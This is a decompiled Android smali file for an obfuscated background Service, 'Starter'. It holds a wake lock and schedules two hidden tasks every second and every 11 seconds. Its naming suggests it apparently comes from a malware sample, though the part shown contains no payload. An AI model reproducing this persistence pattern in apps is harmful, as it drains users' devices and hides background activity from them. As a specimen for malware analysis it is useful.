.class public Lcom/rt/me/Starter;
.super Landroid/app/Service;
.source "Starter.java"


# static fields
.field public static drunded:I


# instance fields
.field public clouder1Contx:Landroid/content/Context;

.field private clouder1Prefs:Landroid/content/SharedPreferences;

.field private ideaManager:Landroid/os/PowerManager$WakeLock;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 17
    const/4 v0, 0x5

    sput v0, Lcom/rt/me/Starter;->drunded:I

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 15
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method static getAppContext(Lcom/rt/me/Starter;)Landroid/content/Context;
    .locals 1
    .param p0, "glavService"    # Lcom/rt/me/Starter;

    .prologue
    .line 27
    iget-object v0, p0, Lcom/rt/me/Starter;->clouder1Contx:Landroid/content/Context;

    return-object v0
.end method

.method static getDBInstance(Lcom/rt/me/Starter;)Landroid/content/SharedPreferences;
    .locals 1
    .param p0, "glavService"    # Lcom/rt/me/Starter;

    .prologue
    .line 23
    iget-object v0, p0, Lcom/rt/me/Starter;->clouder1Prefs:Landroid/content/SharedPreferences;

    return-object v0
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 31
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 9

    .prologue
    const-wide/16 v7, 0x1

    .line 35
    const-string v1, "power"

    invoke-virtual {p0, v1}, Lcom/rt/me/Starter;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/os/PowerManager;

    .line 36
    const/4 v2, 0x1

    const-string v3, "WakeLock"

    invoke-virtual {v1, v2, v3}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v1

    .line 35
    iput-object v1, p0, Lcom/rt/me/Starter;->ideaManager:Landroid/os/PowerManager$WakeLock;

    .line 37
    iget-object v1, p0, Lcom/rt/me/Starter;->ideaManager:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v1}, Landroid/os/PowerManager$WakeLock;->acquire()V

    .line 38
    invoke-virtual {p0}, Lcom/rt/me/Starter;->getBaseContext()Landroid/content/Context;

    move-result-object v1

    iput-object v1, p0, Lcom/rt/me/Starter;->clouder1Contx:Landroid/content/Context;

    .line 40
    const-string v1, "p3QYtx8errMS2uohNz9pGuHY0kIOUY3v"

    const/4 v2, 0x0

    .line 39
    invoke-virtual {p0, v1, v2}, Lcom/rt/me/Starter;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    iput-object v1, p0, Lcom/rt/me/Starter;->clouder1Prefs:Landroid/content/SharedPreferences;

    .line 41
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 43
    const/16 v1, 0xa

    sput v1, Lcom/rt/me/Starter;->drunded:I

    .line 45
    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadScheduledExecutor()Ljava/util/concurrent/ScheduledExecutorService;

    move-result-object v0

    .line 47
    .local v0, "servstarters":Ljava/util/concurrent/ScheduledExecutorService;
    new-instance v1, Lcom/rt/me/IrtStopo;

    invoke-direct {v1, p0}, Lcom/rt/me/IrtStopo;-><init>(Lcom/rt/me/Starter;)V

    const-wide/16 v2, 0x0

    const-wide/16 v4, 0xb

    .line 48
    sget-object v6, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    .line 47
    invoke-interface/range {v0 .. v6}, Ljava/util/concurrent/ScheduledExecutorService;->scheduleAtFixedRate(Ljava/lang/Runnable;JJLjava/util/concurrent/TimeUnit;)Ljava/util/concurrent/ScheduledFuture;

    .line 50
    new-instance v1, Lcom/rt/me/Irt2;

    invoke-direct {v1, p0}, Lcom/rt/me/Irt2;-><init>(Lcom/rt/me/Starter;)V

    .line 51
    sget-object v6, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    move-wide v2, v7

    move-wide v4, v7

    .line 50
    invoke-interface/range {v0 .. v6}, Ljava/util/concurrent/ScheduledExecutorService;->scheduleAtFixedRate(Ljava/lang/Runnable;JJLjava/util/concurrent/TimeUnit;)Ljava/util/concurrent/ScheduledFuture;

    .line 52
    return-void
.end method

.method public onDestroy()V
    .locals 4

    .prologue
    .line 55
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 58
    :try_start_0
    iget-object v1, p0, Lcom/rt/me/Starter;->ideaManager:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    const-string v2, "release"

    const/4 v3, 0x0

    new-array v3, v3, [Ljava/lang/Class;

    invoke-virtual {v1, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v1

    iget-object v2, p0, Lcom/rt/me/Starter;->ideaManager:Landroid/os/PowerManager$WakeLock;

    const/4 v3, 0x0

    new-array v3, v3, [Ljava/lang/Object;

    invoke-virtual {v1, v2, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/IllegalArgumentException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/lang/SecurityException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/IllegalAccessException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljava/lang/reflect/InvocationTargetException; {:try_start_0 .. :try_end_0} :catch_3
    .catch Ljava/lang/NoSuchMethodException; {:try_start_0 .. :try_end_0} :catch_4

    .line 75
    :goto_0
    const/4 v1, 0x5

    sput v1, Lcom/rt/me/Starter;->drunded:I

    .line 76
    return-void

    .line 59
    :catch_0
    move-exception v0

    .line 61
    .local v0, "e":Ljava/lang/IllegalArgumentException;
    invoke-virtual {v0}, Ljava/lang/IllegalArgumentException;->printStackTrace()V

    goto :goto_0

    .line 62
    .end local v0    # "e":Ljava/lang/IllegalArgumentException;
    :catch_1
    move-exception v0

    .line 64
    .local v0, "e":Ljava/lang/SecurityException;
    invoke-virtual {v0}, Ljava/lang/SecurityException;->printStackTrace()V

    goto :goto_0

    .line 65
    .end local v0    # "e":Ljava/lang/SecurityException;
    :catch_2
    move-exception v0

    .line 67
    .local v0, "e":Ljava/lang/IllegalAccessException;
    invoke-virtual {v0}, Ljava/lang/IllegalAccessException;->printStackTrace()V

    goto :goto_0

    .line 68
    .end local v0    # "e":Ljava/lang/IllegalAccessException;
    :catch_3
    move-exception v0

    .line 70
    .local v0, "e":Ljava/lang/reflect/InvocationTargetException;
    invoke-virtual {v0}, Ljava/lang/reflect/InvocationTargetException;->printStackTrace()V

    goto :goto_0

    .line 71
    .end local v0    # "e":Ljava/lang/reflect/InvocationTargetException;
    :catch_4
    move-exception v0

    .line 73
    .local v0, "e":Ljava/lang/NoSuchMethodException;
    invoke-virtual {v0}, Ljava/lang/NoSuchMethodException;->printStackTrace()V

    goto :goto_0
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "j"    # I
    .param p3, "k"    # I

    .prologue
    .line 79
    invoke-super {p0, p1, p2, p3}, Landroid/app/Service;->onStartCommand(Landroid/content/Intent;II)I

    move-result v0

    return v0
.end method
